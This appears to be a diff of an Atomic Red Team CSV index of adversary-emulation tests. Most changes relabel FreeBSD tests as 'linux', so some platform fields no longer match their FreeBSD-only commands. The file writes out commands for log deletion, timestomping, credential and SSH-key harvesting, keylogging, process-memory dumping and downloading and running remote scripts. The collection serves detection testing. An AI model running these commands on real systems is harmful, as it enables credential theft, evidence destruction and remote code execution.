 ",,"dependencies.0.description: The file must exist in order to be timestomped
 
@@ -8028,7 +8089,7 @@ input_arguments.target_filename.default: /tmp/T1070.006-access.txt
 
 "
 T1070.006,Indicator Removal on Host: Timestomp,Set a file's modification timestamp,20ef1523-8758-4898-b5a2-d026cc3d2c52,"Stomps on the modification timestamp of a file
-",freebsd,linux,macos,"touch -m -t 197001010000.00 #{target_filename}
+",linux,macos,,"touch -m -t 197001010000.00 #{target_filename}
 ",sh,,,"rm -f #{target_filename}
 ",,"dependencies.0.description: The file must exist in order to be timestomped
 
@@ -8047,7 +8108,7 @@ T1070.006,Indicator Removal on Host: Timestomp,Set a file's creation timestamp,8
 
 Setting the creation timestamp requires changing the system clock and reverting.
 Sudo or root privileges are required to change date. Use with caution.
-",freebsd,linux,macos,"NOW=$(date +%m%d%H%M%Y)
+",linux,macos,,"NOW=$(date +%m%d%H%M%Y)
 date 010100001971
 touch #{target_filename}
 date ""$NOW""
@@ -8063,7 +8124,7 @@ input_arguments.target_filename.default: /tmp/T1070.006-creation.txt
 T1070.006,Indicator Removal on Host: Timestomp,Modify file timestamps using reference file,631ea661-d661-44b0-abdb-7a7f3fc08e50,"Modifies the `modify` and `access` timestamps using the timestamps of a specified reference file.
 
 This technique was used by the threat actor Rocke during the compromise of Linux web servers.
-",freebsd,linux,macos,"touch -acmr #{reference_file_path} #{target_file_path}
+",linux,macos,,"touch -acmr #{reference_file_path} #{target_file_path}
 ",sh,,,"rm -f #{target_file_path}
 ",,"dependencies.0.description: The file must exist in order to be timestomped
 
@@ -8285,7 +8346,7 @@ input_arguments.libaudit_config_file_name.default: libaudit.conf
 
 "
 T1562.006,Impair Defenses: Indicator Blocking,Auditing Configuration Changes on FreeBSD Host,cedaf7e7-28ee-42ab-ba13-456abd35d1bd,"Emulates modification of auditd configuration files
-",freebsd,,,"echo '#art_test_1562_006_1' >> /etc/security/#{auditd_config_file_name}
+",linux,,,"echo '#art_test_1562_006_1' >> /etc/security/#{auditd_config_file_name}
 ",sh,True,,"sed -i """" '/#art_test_1562_006_1/d' /etc/security/#{auditd_config_file_name}
 ",,,"input_arguments.auditd_config_file_name.description: The name of the auditd configuration file to be changed
 
@@ -8333,7 +8394,7 @@ input_arguments.syslog_ng_config_file_name.default: syslog-ng.conf
 
 "
 T1562.006,Impair Defenses: Indicator Blocking,Logging Configuration Changes on FreeBSD Host,6b8ca3ab-5980-4321-80c3-bcd77c8daed8,"Emulates modification of syslog configuration.
-",freebsd,,,"if [ -f ""/etc/#{syslog_config_file_name}"" ];
+",linux,,,"if [ -f ""/etc/#{syslog_config_file_name}"" ];
 then echo '#art_test_1562_006_2' >> /etc/#{syslog_config_file_name}
 fi
 ",sh,True,,"if [ -f ""/etc/#{syslog_config_file_name}"" ];
@@ -8385,7 +8446,7 @@ https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 ",powershell,True,,"Remove-ItemProperty ""HKLM:\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational"" -Name Enabled -Force -ErrorAction Ignore
 ",,,
 T1552.001,Unsecured Credentials: Credentials In Files,Find AWS credentials,2b93758e-a8d7-4e3b-bc7b-d3aa8d7ecb17,"Find local AWS credentials from file, defaults to using / as the look path.
-",freebsd,macos,linux,"find #{file_path} -name ""credentials"" -type f -path ""*/.aws/*"" 2>/dev/null
+",macos,linux,,"find #{file_path} -name ""credentials"" -type f -path ""*/.aws/*"" 2>/dev/null
 ",sh,,,,,,"input_arguments.file_path.description: Path to search
 
 input_arguments.file_path.type: string
@@ -8397,7 +8458,7 @@ T1552.001,Unsecured Credentials: Credentials In Files,Extract Browser and System
 ",macos,,,"python2 laZagne.py all
 ",bash,True,,,,,
 T1552.001,Unsecured Credentials: Credentials In Files,Extract passwords with grep,bd4cf0d1-7646-474e-8610-78ccf5a097c4,"Extracting credentials from files
-",freebsd,macos,linux,"grep -ri password #{file_path}
+",linux,macos,,"grep -ri password #{file_path}
 exit 0
 ",sh,,,,,,"input_arguments.file_path.description: Path to search
 
@@ -8416,7 +8477,7 @@ If these files exist, their contents will be displayed. They are used to store c
 type C:\Windows\Panther\Unattend\unattend.xml
 ",command_prompt,True,,,,,
 T1552.001,Unsecured Credentials: Credentials In Files,Find and Access Github Credentials,da4f751a-020b-40d7-b9ff-d433b7799803,"This test looks for .netrc files (which stores github credentials in clear text )and dumps its contents if found.
-",freebsd,macos,linux,"for file in $(find #{file_path} -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done
+",linux,macos,,"for file in $(find #{file_path} -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done
 ",bash,False,,,,,"input_arguments.file_path.description: Path to search
 
 input_arguments.file_path.type: string
@@ -8526,7 +8587,7 @@ brew install tor
 ",
 T1090.003,Proxy: Multi-hop Proxy,Tor Proxy Usage - FreeBSD,550ec67d-a99e-408b-816a-689271b27d2a,"This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.
 Upon successful execution, the tor proxy service will be launched. 
-",freebsd,,,"sysrc tor_enable=""YES""
+",linux,,,"sysrc tor_enable=""YES""
 service tor start
 ",sh,True,,"service tor stop
 sysrc -x tor_enable
@@ -8953,7 +9014,7 @@ input_arguments.command_to_execute.default: hostname
 
 "
 T1560.002,Archive Collected Data: Archive via Library,Compressing data using GZip in Python (FreeBSD/Linux),391f5298-b12d-4636-8482-35d9c17d53a8,"Uses GZip from Python to compress files
-",freebsd,linux,,"which_python=`which python || which python3`
+",linux,,,"which_python=`which python || which python3`
 $which_python -c ""import gzip;input_file=open('#{path_to_input_file}', 'rb');content=input_file.read();input_file.close();output_file=gzip.GzipFile('#{path_to_output_file}','wb',compresslevel=6);output_file.write(content);output_file.close();""
 ",sh,False,,"rm #{path_to_output_file}
 ",sh,"dependencies.0.description: Requires Python
@@ -8976,7 +9037,7 @@ input_arguments.path_to_output_file.default: /tmp/passwd.gz
 
 "
 T1560.002,Archive Collected Data: Archive via Library,Compressing data using bz2 in Python (FreeBSD/Linux),c75612b2-9de0-4d7c-879c-10d7b077072d,"Uses bz2 from Python to compress files
-",freebsd,linux,,"which_python=`which python || which python3`
+",linux,,,"which_python=`which python || which python3`
 $which_python -c ""import bz2;input_file=open('#{path_to_input_file}','rb');content=input_file.read();input_file.close();bz2content=bz2.compress(content,compresslevel=9);output_file=open('#{path_to_output_file}','w+');output_file.write(str(bz2content));output_file.close();""
 ",sh,False,,"rm #{path_to_output_file}
 ",sh,"dependencies.0.description: Requires Python
@@ -8999,7 +9060,7 @@ input_arguments.path_to_output_file.default: /tmp/passwd.bz2
 
 "
 T1560.002,Archive Collected Data: Archive via Library,Compressing data using zipfile in Python (FreeBSD/Linux),001a042b-859f-44d9-bf81-fd1c4e2200b0,"Uses zipfile from Python to compress files
-",freebsd,linux,,"which_python=`which python || which python3`
+",linux,,,"which_python=`which python || which python3`
 $which_python -c ""from zipfile import ZipFile; ZipFile('#{path_to_output_file}', mode='w').write('#{path_to_input_file}')""
 ",sh,False,,"rm #{path_to_output_file}
 ",sh,"dependencies.0.description: Requires Python
@@ -9022,7 +9083,7 @@ input_arguments.path_to_output_file.default: /tmp/passwd.zip
 
 "
 T1560.002,Archive Collected Data: Archive via Library,Compressing data using tarfile in Python (FreeBSD/Linux),e86f1b4b-fcc1-4a2a-ae10-b49da01458db,"Uses tarfile from Python to compress files
-",freebsd,linux,,"which_python=`which python || which python3`
+",linux,,,"which_python=`which python || which python3`
 $which_python -c ""from zipfile import ZipFile; ZipFile('#{path_to_output_file}', mode='w').write('#{path_to_input_file}')"" 
 ",sh,False,,"rm #{path_to_output_file}
 ",sh,"dependencies.0.description: Requires Python
@@ -9520,7 +9581,7 @@ T1037.002,Boot or Logon Initialization Scripts: Logon Script (Mac),Logon Scripts
 
 	  defaults write com.apple.loginwindow LoginHook /Library/Scripts/AtomicRedTeam.sh
 ",,,,
-T1059.006,Command and Scripting Interpreter: Python,Execute shell script via python's command mode arguement,3a95cdb2-c6ea-4761-b24e-02b71889b8bb,Download and execute shell script and write to file then execute locally using Python -c (command mode),freebsd,linux,,"which_python=$(which python || which python3 || which python3.9 || which python2)
+T1059.006,Command and Scripting Interpreter: Python,Execute shell script via python's command mode arguement,3a95cdb2-c6ea-4761-b24e-02b71889b8bb,Download and execute shell script and write to file then execute locally using Python -c (command mode),linux,,,"which_python=$(which python || which python3 || which python3.9 || which python2)
 $which_python -c 'import requests;import os;url = ""#{script_url}"";malicious_command = ""#{executor} #{payload_file_name} #{script_args}"";session = requests.session();source = session.get(url).content;fd = open(""#{payload_file_name}"", ""wb+"");fd.write(source);fd.close();os.system(malicious_command)'
 ",sh,,,"rm #{payload_file_name} 
 ",sh,"dependencies.0.description: Verify if python is in the environment variable path and attempt to import requests library.
@@ -9554,7 +9615,7 @@ input_arguments.script_args.type: string
 input_arguments.script_args.default: -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles
 
 "
-T1059.006,Command and Scripting Interpreter: Python,Execute Python via scripts,6c4d1dcb-33c7-4c36-a8df-c6cfd0408be8,Create Python file (.py) that downloads and executes shell script via executor arguments,freebsd,linux,,"which_python=$(which python || which python3 || which python3.9 || which python2)
+T1059.006,Command and Scripting Interpreter: Python,Execute Python via scripts,6c4d1dcb-33c7-4c36-a8df-c6cfd0408be8,Create Python file (.py) that downloads and executes shell script via executor arguments,linux,,,"which_python=$(which python || which python3 || which python3.9 || which python2)
 echo 'import requests' > #{python_script_name}
 echo 'import os' >> #{python_script_name}
 echo 'url = ""#{script_url}""' >> #{python_script_name}
@@ -9606,7 +9667,7 @@ input_arguments.script_args.default: -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsS
 
 "
 T1059.006,Command and Scripting Interpreter: Python,Execute Python via Python executables,0b44d79b-570a-4b27-a31f-3bf2156e5eaa,"Create Python file (.py) then compile to binary (.pyc) that downloads an external malicious script then executes locally using the supplied executor and arguments
-",freebsd,linux,,"which_python=$(which python || which python3 || which python3.9 || which python2)
+",linux,,,"which_python=$(which python || which python3 || which python3.9 || which python2)
 echo 'import requests' > #{python_script_name}
 echo 'import os' >> #{python_script_name}
 echo 'url = ""#{script_url}""' >> #{python_script_name}
@@ -9665,7 +9726,7 @@ input_arguments.python_binary_name.default: T1059.006.pyc
 
 "
 T1059.006,Command and Scripting Interpreter: Python,Python pty module and spawn function used to spawn sh or bash,161d694c-b543-4434-85c3-c3a433e33792,"Uses the Python spawn function to spawn a sh shell followed by a bash shell. Per Volexity, this technique was observed in exploitation of Atlassian Confluence [CVE-2022-26134]. Reference: https://www.volexity.com/blog/2022/06/02/zero-day-exploitation-of-atlassian-confluence
-",freebsd,linux,,"which_python=$(which python || which python3 || which python3.9 || which python2)
+",linux,,,"which_python=$(which python || which python3 || which python3.9 || which python2)
 $which_python -c ""import pty;pty.spawn('/bin/sh')""
 exit
 $which_python -c ""import pty;pty.spawn('/bin/bash')""
@@ -9678,7 +9739,7 @@ dependencies.0.get_prereq_command: pip install requests
 
 ",
 T1030,Data Transfer Size Limits,Data Transfer Size Limits,ab936c51-10f4-46ce-9144-e02137b2016a,"Take a file/directory, split it into 5Mb chunks
-",macos,linux,freebsd,"cd #{folder_path}; split -b 5000000 #{file_name}
+",macos,linux,,"cd #{folder_path}; split -b 5000000 #{file_name}
 ls -l #{folder_path}
 ",sh,,,"if [ -f #{folder_path}/safe_to_delete ]; then rm -rf #{folder_path}; fi;
 ",sh,"dependencies.0.description: The file must exist for the test to run.
@@ -9906,7 +9967,7 @@ input_arguments.package_installer.default: (which yum && yum -y install epel-rel
 
 "
 T1135,Network Share Discovery,Network Share Discovery - FreeBSD,77e468a6-3e5c-45a1-9948-c4b5603747cb,"Network Share Discovery using smbstatus
-",freebsd,,,"smbstatus --shares
+",linux,,,"smbstatus --shares
 ",sh,True,,,sh,"dependencies.0.description: Package with smbstatus (samba) must exist on device
 
 dependencies.0.prereq_command: if #{package_checker} > /dev/null; then exit 0; else exit 1; fi
@@ -10503,7 +10564,7 @@ input_arguments.pid_term.default: T1003.007
 T1003.007,OS Credential Dumping: Proc Filesystem,Dump individual process memory with sh on FreeBSD (Local),fa37b633-e097-4415-b2b8-c5bf4c86e423,"Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to
 copy process memory to an external file so it can be searched or exfiltrated later.
 On FreeBSD procfs must be mounted.
-",freebsd,,,"sh #{script_path}
+",linux,,,"sh #{script_path}
 PID=$(pgrep -n -f ""#{pid_term}"")
 MEM_START=$(head -n 5 /proc/""${PID}""/map | tail -1 | cut -d' ' -f1)
 MEM_STOP=$(head -n 5 /proc/""${PID}""/map | tail -1 | cut -d' ' -f2)
@@ -10541,7 +10602,7 @@ input_arguments.pid_term.default: T1003.007
 T1003.007,OS Credential Dumping: Proc Filesystem,Dump individual process memory with Python (Local),437b2003-a20d-4ed8-834c-4964f24eec63,"Using `/proc/$PID/mem`, where $PID is the target process ID, use a Python script to
 copy a process's heap memory to an external file so it can be searched or exfiltrated later.
 On FreeBSD procfs must be mounted.
-",freebsd,linux,,"sh #{script_path}
+",linux,,,"sh #{script_path}
 PID=$(pgrep -n -f ""#{pid_term}"")
 PYTHON=$(which python || which python3 || which python2)
 $PYTHON #{python_script} $PID #{output_file}
@@ -11182,7 +11243,7 @@ input_arguments.remote_url.default: https://raw.githubusercontent.com/redcanaryc
 T1110.001,Brute Force: Password Guessing,SUDO Brute Force - FreeBSD,abcde488-e083-4ee7-bc85-a5684edd7541,"An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. 
 
 This test creates the ""art"" user with a password of ""password123"", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user
-",freebsd,,,"pw adduser art -g wheel -s /bin/sh
+",linux,,,"pw adduser art -g wheel -s /bin/sh
 echo ""password123"" | pw usermod art -h 0
 su art
 cd /tmp
@@ -11297,7 +11358,7 @@ The trap executes script that writes to /tmp/art-fish.txt
 ",,,
 T1546.005,Event Triggered Execution: Trap,Trap EXIT (freebsd),be1a5d70-6865-44aa-ab50-42244c9fd16f,"Launch bash shell with command arg to create TRAP on EXIT.
 The trap executes script that writes to /tmp/art-fish.txt
-",freebsd,,,"bash -c 'trap ""nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh"" EXIT'
+",linux,,,"bash -c 'trap ""nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh"" EXIT'
 ",sh,,,"rm -f /tmp/art-fish.txt
 ",sh,"dependencies.0.description: Check if bash is installed.
 
@@ -11313,7 +11374,7 @@ The trap executes script that writes to /tmp/art-fish.txt
 ",,,
 T1546.005,Event Triggered Execution: Trap,Trap SIGINT (freebsd),ade10242-1eac-43df-8412-be0d4c704ada,"Launch bash shell with command arg to create TRAP on SIGINT (CTRL+C), then send SIGINT signal.
 The trap executes script that writes to /tmp/art-fish.txt
-",freebsd,,,"bash -c 'trap ""nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh"" SIGINT && kill -SIGINT $$'
+",linux,,,"bash -c 'trap ""nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh"" SIGINT && kill -SIGINT $$'
 ",sh,,,"rm -f /tmp/art-fish.txt
 ",sh,"dependencies.0.description: Check if bash is installed.
 
@@ -11382,7 +11443,7 @@ dependencies.0.get_prereq_command: echo """"
 T1056.001,Input Capture: Keylogging,Logging sh history to syslog/messages,b04284dc-3bd9-4840-8d21-61b8d31c99f2,"There are several variables that can be set to control the appearance of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents of these variables are executed as if they had been typed on the command line. The PROMPT_COMMAND variable ""if set"" will be executed before the PS1 variable and can be configured to write the latest ""bash history"" entries to the syslog.
 
 To gain persistence the command could be added to the users .shrc or .profile 
-",freebsd,,,"PS2=`logger -t ""$USER"" -f ~/.sh_history`
+",linux,,,"PS2=`logger -t ""$USER"" -f ~/.sh_history`
 $PS2
 tail /var/log/messages
 ",sh,True,,"unset PS2
@@ -11397,7 +11458,7 @@ dependencies.0.get_prereq_command: echo """"
 T1056.001,Input Capture: Keylogging,Bash session based keylogger,7f85a946-a0ea-48aa-b6ac-8ff539278258,"When a command is executed in bash, the BASH_COMMAND variable contains that command. For example :~$ echo $BASH_COMMAND = ""echo $BASH_COMMAND"". The trap command is not a external command, but a built-in function of bash and can be used in a script to run a bash function when some event occurs. trap will detect when the BASH_COMMAND variable value changes and then pipe that value into a file, creating a bash session based keylogger. 
 
 To gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ 
-",freebsd,linux,,"trap 'echo ""$(date +""%d/%m/%y %H:%M:%S.%s"") $USER $BASH_COMMAND"" >> #{output_file}' DEBUG
+",linux,,,"trap 'echo ""$(date +""%d/%m/%y %H:%M:%S.%s"") $USER $BASH_COMMAND"" >> #{output_file}' DEBUG
 echo ""Hello World!""
 cat #{output_file}
 ",bash,False,,"rm #{output_file}
@@ -11537,7 +11598,7 @@ input_arguments.input_file.default: PathToAtomicsFolder\T1027.004\bin\T1027.004_
 
 "
 T1027.004,Obfuscated Files or Information: Compile After Delivery,C compile,d0377aa6-850a-42b2-95f0-de558d80be57,"Compile a c file with either gcc or clang on FreeBSD, Linux or Macos.
-",freebsd,linux,macos,"gcc #{input_file} && ./a.out
+",linux,macos,,"gcc #{input_file} && ./a.out
 clang #{input_file} && ./a.out
 ",sh,,,,sh,"dependencies.0.description: the source file must exist on disk at specified location (#{input_file})
 
@@ -11553,7 +11614,7 @@ input_arguments.input_file.default: PathToAtomicsFolder/T1027.004/src/T1027-004-
 
 "
 T1027.004,Obfuscated Files or Information: Compile After Delivery,CC compile,da97bb11-d6d0-4fc1-b445-e443d1346efe,"Compile a c file with either gcc or clang on FreeBSD, Linux or Macos.
-",freebsd,linux,macos,"g++ #{input_file} && ./a.out
+",linux,macos,,"g++ #{input_file} && ./a.out
 clang++ #{input_file} && ./a.out
 ",sh,,,,sh,"dependencies.0.description: the source file must exist on disk at specified location (#{input_file})
 
@@ -11569,7 +11630,7 @@ input_arguments.input_file.default: PathToAtomicsFolder/T1027.004/src/T1027-004-
 
 "
 T1027.004,Obfuscated Files or Information: Compile After Delivery,Go compile,78bd3fa7-773c-449e-a978-dc1f1500bc52,"Compile a go file with golang on FreeBSD, Linux or Macos.
-",freebsd,linux,macos,"go run #{input_file}
+",linux,macos,,"go run #{input_file}
 ",sh,,,,sh,"dependencies.0.description: the source file must exist on disk at specified location (#{input_file})
 
 dependencies.0.prereq_command: if [ -e  #{input_file} ]; then exit 0; else exit 1; fi
@@ -11592,7 +11653,7 @@ T1082,System Information Discovery,System Information Discovery,edff98ec-0f73-4f
 ls -al /Applications
 ",sh,,,,,,
 T1082,System Information Discovery,List OS Information,cccb070c-df86-4216-a5bc-9fb60c74e27c,"Identify System Info
-",freebsd,linux,macos,"uname -a >> #{output_file}
+",linux,macos,,"uname -a >> #{output_file}
 if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> #{output_file}; fi
 if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> #{output_file}; fi   
 if [ -f /etc/issue ]; then cat /etc/issue >> #{output_file}; fi
@@ -11625,14 +11686,14 @@ sudo lsmod | grep -i ""virtio_pci\|virtio_net""
 sudo lsmod | grep -i ""hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc""
 ",bash,,,,,,
 T1082,System Information Discovery,FreeBSD VM Check via Kernel Modules,eefe6a49-d88b-41d8-8fc2-b46822da90d3,"Identify virtual machine host kernel modules.
-",freebsd,,,"kldstat | grep -i ""vmm""
+",linux,,,"kldstat | grep -i ""vmm""
 kldstat | grep -i ""vbox""
 ",sh,,,,,,
 T1082,System Information Discovery,Hostname Discovery (Windows),85cfbf23-4a1e-4342-8792-007e004b975f,"Identify system hostname for Windows. Upon execution, the hostname of the device will be displayed.
 ",windows,,,"hostname
 ",command_prompt,,,,,,
 T1082,System Information Discovery,Hostname Discovery,486e88ea-4f56-470f-9b57-3f4d73f39133,"Identify system hostname for FreeBSD, Linux and macOS systems.
-",freebsd,linux,macos,"hostname
+",linux,macos,,"hostname
 ",sh,,,,,,
 T1082,System Information Discovery,Windows MachineGUID Discovery,224b4daf-db44-404e-b6b2-f4d1f0126ef8,"Identify the Windows MachineGUID value for a system. Upon execution, the machine GUID will be displayed from registry.
 ",windows,,,"REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid
@@ -11658,7 +11719,7 @@ T1082,System Information Discovery,Environment variables discovery on windows,f4
 ",windows,,,"set
 ",command_prompt,,,,,,
 T1082,System Information Discovery,"Environment variables discovery on freebsd, macos and linux",fcbdd43f-f4ad-42d5-98f3-0218097e2720,"Identify all environment variables. Upon execution, environments variables and your path info will be displayed.
-",freebsd,macos,linux,"env
+",linux,macos,,"env
 ",sh,,,,,,
 T1082,System Information Discovery,Show System Integrity Protection status (MacOS),327cc050-9e99-4c8e-99b5-1d15f2fb6b96,"Read and Display System Intergrety Protection status. csrutil is commonly used by malware and post-exploitation tools to determine whether certain files and directories on the system are writable or not.
 ",macos,,,"csrutil status
@@ -11746,7 +11807,7 @@ kmod list
 grep vmw /proc/modules
 ",sh,,,,,,
 T1082,System Information Discovery,FreeBSD List Kernel Modules,4947897f-643a-4b75-b3f5-bed6885749f6,"Enumerate kernel modules loaded. Upon successful execution stdout will display kernel modules loaded, followed by list of modules matching 'vmm' if present.
-",freebsd,,,"kldstat
+",linux,,,"kldstat
 kldstat | grep vmm
 ",sh,,,,,,
 T1082,System Information Discovery,System Information Discovery with WMIC,8851b73a-3624-4bf7-8704-aa312411565c,"Identify system information with the WMI command-line (WMIC) utility. Upon execution, various system information will be displayed, including: OS, CPU, GPU, and disk drive names; memory capacity; display resolution; and baseboard, BIOS, and GPU driver products/versions.
@@ -12059,7 +12120,14 @@ copy ""#{Path_inf}"" %TEMP%\ieuinit.inf
 %TEMP%\ie4uinit.exe -BaseSettings
 ",command_prompt,,,"del %TEMP%\ie4uinit.exe >nul 2>&1
 del %TEMP%\ieuinit.inf >nul 2>&1
-",,,"input_arguments.Path_inf.description: Path to the cab file
+",powershell,"dependencies.0.description: ieuinit.inf must exist on disk at specified location (#{Path_inf})
+
+dependencies.0.prereq_command: if (Test-Path ""#{Path_inf}"") {exit 0} else {exit 1}
+
+dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{Path_inf}"") -ErrorAction ignore | Out-Null
+Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/ieuinit.inf"" -OutFile ""#{Path_inf}""
+
+","input_arguments.Path_inf.description: Path to the cab file
 
 input_arguments.Path_inf.type: path
 
@@ -12143,7 +12211,7 @@ input_arguments.macos_audit_path.default: /var/audit/20220725213300.202208110700
 
 "
 T1070.002,"Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",rm -rf,bd8ccc45-d632-481e-b7cf-c467627d68f9,"Delete messages and security logs
-",freebsd,,,"rm -rf /var/log/messages
+",linux,,,"rm -rf /var/log/messages
 rm -rf /var/log/security
 ",sh,True,,,,,
 T1070.002,"Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",Delete log files using built-in log utility,653d39cd-bae7-499a-898c-9fb96b8b5cd1,"This test deletes main log datastore, inflight log data, time-to-live data(TTL), fault and error content
@@ -12167,7 +12235,7 @@ input_arguments.system_log_path.default: /var/log/system.log
 
 "
 T1070.002,"Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",Truncate system log files via truncate utility (freebsd),14033063-ee04-4eaf-8f5d-ba07ca7a097c,"This test truncates the system log files using the truncate utility with (-s 0 or --size=0) parameter which sets file size to zero, thus emptying the file content
-",freebsd,,,"truncate -s 0 /var/log/messages #size parameter shorthand
+",linux,,,"truncate -s 0 /var/log/messages #size parameter shorthand
 truncate --size=0 /var/log/security #size parameter 
 ",sh,True,,,,,
 T1070.002,"Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",Delete log files via cat utility by appending /dev/null or /dev/zero,c23bdb88-928d-493e-b46d-df2906a50941,"The first sub-test truncates the log file to zero bytes via /dev/null and the second sub-test fills the log file with null bytes(zeroes) via /dev/zero, using cat utility
@@ -12187,7 +12255,7 @@ input_arguments.system_log_path.default: /var/log/system.log
 
 "
 T1070.002,"Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",Delete log files via cat utility by appending /dev/null or /dev/zero (freebsd),369878c6-fb04-48d6-8fc2-da9d97b3e054,"The first sub-test truncates the log file to zero bytes via /dev/null and the second sub-test fills the log file with null bytes(zeroes) via /dev/zero, using cat utility
-",freebsd,,,"cat /dev/null > /var/log/messages #truncating the file to zero bytes
+",linux,,,"cat /dev/null > /var/log/messages #truncating the file to zero bytes
 cat /dev/zero > /var/lol/messages #log file filled with null bytes(zeros)
 ",sh,True,,,,,
 T1070.002,"Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",System log file deletion via find utility,bc8eeb4a-cc3e-45ec-aa6e-41e973da2558,"This test finds and deletes the system log files within /var/log/ directory using various executions(rm, shred, unlink)
@@ -12229,7 +12297,7 @@ input_arguments.system_log_path.default: /var/log/system.log
 
 "
 T1070.002,"Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",Overwrite FreeBSD system log via echo utility,11cb8ee1-97fb-4960-8587-69b8388ee9d9,"This test overwrites the contents of system log file with an empty string using echo utility
-",freebsd,,,"echo '' > /var/log/messages
+",linux,,,"echo '' > /var/log/messages
 ",sh,True,,,,,
 T1070.002,"Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",Real-time system log clearance/deletion,848e43b3-4c0a-4e4c-b4c9-d1e8cea9651c,"This test reads real-time system log file and writes empty string to it, thus clearing the log file without tampering with the logging process
 ",macos,,,"sudo log -f /var/log/system.log | : > /var/log/system.log
@@ -12250,7 +12318,7 @@ input_arguments.system_log_path.default: /var/log/system.log
 
 "
 T1070.002,"Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",Delete system log files via unlink utility (freebsd),45ad4abd-19bd-4c5f-a687-41f3eee8d8c2,"This test deletes the messages log file using unlink utility
-",freebsd,,,"unlink /var/log/messages
+",linux,,,"unlink /var/log/messages
 ",sh,True,,,,,
 T1070.002,"Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",Delete system log files using shred utility,86f0e4d5-3ca7-45fb-829d-4eda32b232bb,"This test overwrites the contents of the log file with zero bytes(-z) using three passes(-n 3) of data, and then delete the file(-u) securely
 ",macos,,,"sudo shred -u -z -n 3 #{system_log_path}
@@ -12393,7 +12461,7 @@ input_arguments.browser.default: chrome
 
 "
 T1036.005,Masquerading: Match Legitimate Name or Location,Execute a process from a directory masquerading as the current parent directory.,812c3ab8-94b0-4698-a9bf-9420af23ce24,"Create and execute a process from a directory masquerading as the current parent directory (`...` instead of normal `..`)
-",macos,linux,freebsd,"mkdir $HOME/...
+",macos,linux,,"mkdir $HOME/...
 cp $(which sh) $HOME/...
 $HOME/.../sh -c ""echo #{test_message}""
 ",sh,False,,"rm -f $HOME/.../sh
@@ -12428,7 +12496,7 @@ File extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, pfx, .cer, .p7b, .
 ",windows,,,"dir c:\ /b /s .key | findstr /e .key
 ",command_prompt,True,,,,,
 T1552.004,Unsecured Credentials: Private Keys,Discover Private SSH Keys,46959285-906d-40fa-9437-5a439accd878,"Discover private SSH keys on a FreeBSD, macOS or Linux system.
-",freebsd,macos,linux,"find #{search_path} -name id_rsa 2>/dev/null >> #{output_file}
+",linux,macos,,"find #{search_path} -name id_rsa 2>/dev/null >> #{output_file}
 exit 0
 ",sh,,,"rm #{output_file}
 ",,,"input_arguments.search_path.description: Path where to start searching from.
@@ -12463,7 +12531,7 @@ input_arguments.output_folder.default: /tmp/art-staging
 
 "
 T1552.004,Unsecured Credentials: Private Keys,Copy Private SSH Keys with CP (freebsd),12e4a260-a7fd-4ed8-bf18-1a28c1395775,"Copy private SSH keys on a FreeBSD system to a staging folder using the `cp` command.
-",freebsd,,,"mkdir #{output_folder}
+",linux,,,"mkdir #{output_folder}
 find #{search_path} -name id_rsa 2>/dev/null -exec gcp --parents {} #{output_folder} \;
 ",sh,,,"rm -rf #{output_folder}
 ",sh,"dependencies.0.description: Install GNU cp from coreutils package.
@@ -12504,7 +12572,7 @@ input_arguments.output_folder.default: /tmp/art-staging
 
 "
 T1552.004,Unsecured Credentials: Private Keys,Copy Private SSH Keys with rsync (freebsd),922b1080-0b95-42b0-9585-b9a5ea0af044,"Copy private SSH keys on a FreeBSD system to a staging folder using the `rsync` command.
-",freebsd,,,"mkdir #{output_folder}
+",linux,,,"mkdir #{output_folder}
 find #{search_path} -name id_rsa 2>/dev/null -exec rsync -R {} #{output_folder} \;
 ",sh,,,"rm -rf #{output_folder}
 ",sh,"dependencies.0.description: Check if rsync is installed.
@@ -12545,7 +12613,7 @@ input_arguments.output_folder.default: /tmp/GnuPG
 
 "
 T1552.004,Unsecured Credentials: Private Keys,Copy the users GnuPG directory with rsync (freebsd),b05ac39b-515f-48e9-88e9-2f141b5bcad0,"Copy the users GnuPG (.gnupg) directory on a FreeBSD system to a staging folder using the `rsync` command.
-",freebsd,,,"mkdir #{output_folder}
+",linux,,,"mkdir #{output_folder}
 find #{search_path} -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} #{output_folder} \;
 ",sh,,,"rm -rf #{output_folder}
